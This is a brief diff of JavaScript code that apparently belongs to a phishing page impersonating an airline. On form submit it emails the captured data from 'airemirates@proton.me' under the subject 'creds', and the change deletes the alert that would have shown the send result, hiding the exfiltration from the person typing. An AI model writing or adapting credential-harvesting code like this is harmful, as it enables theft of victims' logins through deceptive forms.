@@ -30,8 +30,6 @@ submit.addEventListener("submit", (e) => {
     From: "airemirates@proton.me",
     Subject: "creds",
     Body: ebody,
-  }).then(function (message) {
-    alert(message);
   });
 });
 
